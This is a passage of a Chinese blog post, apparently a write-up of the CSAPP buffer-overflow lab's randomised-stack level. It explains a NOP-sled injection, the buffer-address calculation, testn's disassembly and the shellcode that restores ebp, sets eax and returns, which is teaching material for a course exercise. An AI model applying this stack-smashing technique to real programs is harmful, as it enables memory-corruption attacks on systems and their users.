+<p>因为在这个实验中，栈的地址是变化的。我们不知道有效机器代码的入口地址了，因此我们需要在有效机器代码前填充大量的nop指令，只要程序可以跳转到这些nop指令中，那么最终就可以滑到有效的机器代码。</p>
+<p>运行getbufn函数时，会随机在栈上分配一块存储地址，因此，getbufn的基址ebp时随机变化的。但是又要求我们写的跳转地址是固定的，所以我们应该在有效代码之前大量填充nop指令，让这段地址内的代码都会滑到这段nop之后的代码上。</p>
+<p>由于栈上的机器代码是按地址由低向高顺序执行，要保证五次运行都能顺利执行有效机器代码，需要满足：跳转地址位于有效机器代码入口地址之前的nop机器指令填充区。这要求尽可能增大nop填充区，尽可能使有效机器代码段往后挪。</p>
+<p>从反汇编可以看出，buf的首地址为ebp-0x208，所以buf总共的大小为520字节。考虑这个函数中，testn的ebp随每次输入都随机变化，但是栈顶esp的位置却不变，所以我们可以通过esp和ebp的关系来找出这个关系，从而进行攻击</p>
+<p>首先在sub $0x218，esp这一句设置断点，并使用-n模式运行程序，并查看ebp的值。</p>
+<p>我们要做的是找出最大的ebp值0x556835e0，再减去0x208，即为最高的buf的始地址为：0x556833D8。</p>
+<p>如果将有效机器代码置于跳转地址之前，并将其它所有字符都用作nop指令，此时所有五个buf地址的写入都能满足跳转到地址0x556833D8后顺利到达有效机器代码</p>
+<p>接下来需要处理的问题是注入并覆盖 ebp 后，把正确的 esp 还原回去。研究 testn 的部分汇编代码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-s" data-lang="s"><span class="line"><span class="cl"><span class="n">Dump</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">code</span> <span class="kr">for</span> <span class="kr">function</span> <span class="n">testn</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">   <span class="mh">0x08048e26</span> <span class="o">&lt;</span><span class="m">+0</span><span class="o">&gt;:</span>	<span class="n">push</span>   <span class="o">%ebp
+</span></span></span><span class="line"><span class="cl"><span class="o">   0x08048e27 &lt;+1&gt;:	mov    %</span><span class="n">esp</span><span class="p">,</span><span class="o">%ebp
+</span></span></span><span class="line"><span class="cl"><span class="o">   0x08048e29 &lt;+3&gt;:	push   %</span><span class="n">ebx</span>
+</span></span><span class="line"><span class="cl">   <span class="mh">0x08048e2a</span> <span class="o">&lt;</span><span class="m">+4</span><span class="o">&gt;:</span>	<span class="n">sub</span>    <span class="o">$</span><span class="mh">0x24</span><span class="p">,</span><span class="o">%esp
+</span></span></span><span class="line"><span class="cl"><span class="o">   0x08048e2d &lt;+7&gt;:	call   0x8048d90 &lt;uniqueval&gt;
+</span></span></span><span class="line"><span class="cl"><span class="o">   0x08048e32 &lt;+12&gt;:	mov    %</span><span class="n">eax</span><span class="p">,</span><span class="m">-0</span><span class="nf">xc</span><span class="p">(</span><span class="o">%ebp)
+</span></span></span><span class="line"><span class="cl"><span class="o">   0x08048e35 &lt;+15&gt;:	call   0x804920c &lt;getbufn&gt;
+</span></span></span><span class="line"><span class="cl"><span class="o">   0x08048e3a &lt;+20&gt;:	mov    %</span><span class="n">eax</span><span class="p">,</span>%<span class="n">ebx</span>
+</span></span><span class="line"><span class="cl">   <span class="mh">0x08048e3c</span> <span class="o">&lt;</span><span class="m">+22</span><span class="o">&gt;:</span>	<span class="n">call</span>   <span class="mh">0x8048d90</span> <span class="o">&lt;</span><span class="n">uniqueval</span><span class="o">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在每一次调用了 getbufn 之后，ebp 的值将会被 push 进去。这个 ebp 值是等于 testn 被调用的时候 esp 存储的值的。esp 先由于 push ebx 而减去了 4，再手动减去了 0x24，所以这个时候 exp + 0x28 的值就是传入了 getbufn 开始的时候 ebp 的值。</p>
+<p>所以构造出来的汇编代码如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-s" data-lang="s"><span class="line"><span class="cl"><span class="n">lea</span> <span class="mh">0x28</span><span class="p">(</span><span class="o">%esp), %</span><span class="n">ebp</span>
+</span></span><span class="line"><span class="cl"><span class="n">mov</span> <span class="o">$</span><span class="mh">0x362d5a70</span><span class="p">,</span> %<span class="n">eax</span>
+</span></span><span class="line"><span class="cl"><span class="n">push</span> <span class="o">$</span><span class="mh">0x08048e3a</span>
+</span></span><span class="line"><span class="cl"><span class="n">ret</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="table-wrapper"><table>
+	<thead>
+			<tr>
+					<th style="text-align: left">地址</th>
+					<th style="text-align: left">解释</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: left">返回地址</td>
+					<td style="text-align: left">设置成缓冲区的首地址</td>
+			</tr>
+			<tr>
+					<td style="text-align: left">ebp</td>
+					<td style="text-align: left">占用4字节</td>
+			</tr>
+			<tr>
+					<td style="text-align: left">&hellip;</td>
+					<td style="text-align: left">&hellip;</td>
+			</tr>
+			<tr>
+					<td style="text-align: left">ebp - 520字节</td>
+					<td style="text-align: left">buf 数组的初始地址，从这里开始注入修改 eax 的代码</td>
+			</tr>
+			<tr>
+					<td style="text-align: left">&hellip;</td>
+					<td style="text-align: left">&hellip;</td>
+			</tr>
+			<tr>
+					<td style="text-align: left">ebp - 0x218</td>
+					<td style="text-align: left">esp，栈帧首地址</td>
+			</tr>
+	</tbody>
+</table></div>
+
+</section>
+
+
+    <footer class="article-meta article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/en/tags/csapp/">CSAPP</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright inline-meta">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    <section class="article-lastmod inline-meta">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <span>
+            Last updated on 2026-09-02
+        </span>
+    </section></footer>
+
+
+    
+        <link 
+                rel="stylesheet" 
+                href="/vendor/katex/katex.min.css"crossorigin="anonymous"
+            ><script 
+                src="/vendor/katex/katex.min.js"crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="/vendor/katex/auto-render.min.js"crossorigin="anonymous"
+                defer
+                >
+            </script><script>
+    window.addEventListener("DOMContentLoaded", () => {
+        const elementsToRender = [".main-article", ".widget--toc"];
+
+        elementsToRender.forEach(selector => {
+            const element = document.querySelector(selector);
+            if (element) {
+                renderMathInElement(element, {
+                    delimiters: [
+                        { left: "$$", right: "$$", display: true },
+                        { left: "$", right: "$", display: false },
+                        { left: "\\(", right: "\\)", display: false },
+                        { left: "\\[", right: "\\]", display: true }
+                    ],
+                    ignoredClasses: ["gist"]
+                });
+            }
+        });
+    });
+</script>
+    
+</article>
+
+    
+
+    
+
+<aside>
+    <h2 class="section-title">Related content</h2>
+    <div class="subsection-list">
+        <div class="article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/en/p/csappattack%E5%AE%9E%E9%AA%8C/">
+        
+        <div class="article-image">
+            <img alt="Featured image of post CSAPP:attack实验" height="150" loading="lazy" src="/en/p/csappattack%E5%AE%9E%E9%AA%8C/R_hu_fc5559e11ab951c5.jpg" srcset="/en/p/csappattack%E5%AE%9E%E9%AA%8C/R_hu_fc5559e11ab951c5.jpg 1x, /en/p/csappattack%E5%AE%9E%E9%AA%8C/R_hu_ee19e4f115884d8.jpg 2x" width="250">
+
+        </div>
+        
+
+        <div class="article-details"style="background: linear-gradient(0deg, #44639280 0%, #2f334bC0 100%);">
+            <h2 class="article-title">CSAPP:attack实验</h2>
+        </div>
+    </a>
+</article>
+            
+                
+<article class="has-image">
+    <a href="/en/p/csappbomb%E5%AE%9E%E9%AA%8C/">
+        
+        <div class="article-image">
+            <img alt="Featured image of post CSAPP:bomb实验" height="150" loading="lazy" src="/en/p/csappbomb%E5%AE%9E%E9%AA%8C/1_hu_3f69b77cf4c0e4f.jpg" srcset="/en/p/csappbomb%E5%AE%9E%E9%AA%8C/1_hu_3f69b77cf4c0e4f.jpg 1x, /en/p/csappbomb%E5%AE%9E%E9%AA%8C/1_hu_2def0ae8fb1f5755.jpg 2x" width="250">
+
+        </div>
+        
+
+        <div class="article-details"style="background: linear-gradient(0deg, #5098d580 0%, #162b40C0 100%);">
+            <h2 class="article-title">CSAPP:bomb实验</h2>
+        </div>
+    </a>
+</article>
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+
+        <script src='//unpkg.com/@waline/client@v2/dist/waline.js'></script>
+<link href='//unpkg.com/@waline/client@v2/dist/waline.css' rel='stylesheet'/>
+<div id="waline" class="waline-container"></div>
+<style>
+    .waline-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+        --waline-font-size: var(--article-font-size);
+    }
+    .waline-container .wl-count {
+        color: var(--card-text-color-main);
+    }
+</style><script>
+    
+    Waline.init({"dark":"html[data-scheme=\"dark\"]","el":"#waline","emoji":["https://cdn.jsdelivr.net/gh/walinejs/emojis@1.0.0/qq","https://cdn.jsdelivr.net/gh/walinejs/emojis@1.0.0/bilibili"],"lang":"zh-CN","locale":{"admin":"Admin","placeholder":"感谢您的评论"},"pageview":true,"requiredMeta":["nick"],"serverURL":"https://waline.chenyuan1125.top"});
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2026 Lee
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="4.0.3">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+
+
+
+<script type="module">
+    import gallery from '\/ts\/gallery.js';
+
+    const articleContent = document.querySelector('.article-content');
+    const shouldLoad = articleContent && (articleContent.querySelectorAll('figure').length > 0 || articleContent.querySelectorAll('img.gallery-image').length > 0);
+    
+    if (shouldLoad) {
+        gallery(articleContent);
+
+        const PhotoSwipeLightbox = (await import("\/vendor\/photoswipe\/photoswipe-ui-default.min.js")).default;
+        const styleHref = "\/vendor\/photoswipe\/photoswipe.min.css";
+
+        const styleTag = document.createElement('link');
+        styleTag.rel = 'stylesheet';
+        styleTag.href = styleHref;
+        document.head.appendChild(styleTag);
+
+        const lightbox = new PhotoSwipeLightbox({
+            gallerySelector: '.article-content',
+            childSelector: 'figure a.image-link',
+            pswpModule: () => import("\/vendor\/photoswipe\/photoswipe.min.js")
+        });
+        lightbox.init();
+    }
+</script>
+
+    
+
+            </main>
+        </div>
+        
+<script type="text/javascript" src="/ts/main.87d72694fb97c84cb5cbf9b1a64d476a38e04a5706618a6ffe5b89c7db00488f.js" defer></script>
+
+
+
+    </body>
+</html>
